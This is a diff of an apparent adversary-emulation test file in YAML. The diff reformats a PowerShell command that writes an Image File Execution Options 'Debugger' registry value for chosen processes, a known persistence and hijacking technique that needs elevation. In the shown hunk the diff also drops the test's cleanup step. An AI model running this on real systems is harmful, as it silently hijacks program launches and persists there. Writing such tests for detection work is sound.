@@ -21,13 +21,22 @@ atomic_tests:
       type: Path
       default: C:\windows\system32\cmd.exe
   executor:
-    command: "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){   \n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n"
-    cleanup_command: |
+    command: |
       $input_table = "#{parent_list}".split(",")
-      Foreach ($item in $input_table)
-      {
+      $Name = "Debugger"
+      $Value = "#{attached_process}"
+      Foreach ($item in $input_table){   
         $item = $item.trim()
-        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f | Out-Null
+        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
+        IF(!(Test-Path $registryPath))
+        {
+          New-Item -Path $registryPath -Force
+          New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+        }
+        ELSE
+        {
+          New-ItemProperty -Path $registryPath -Name $name -Value $Value
+        }
       }
     name: powershell
     elevation_required: true
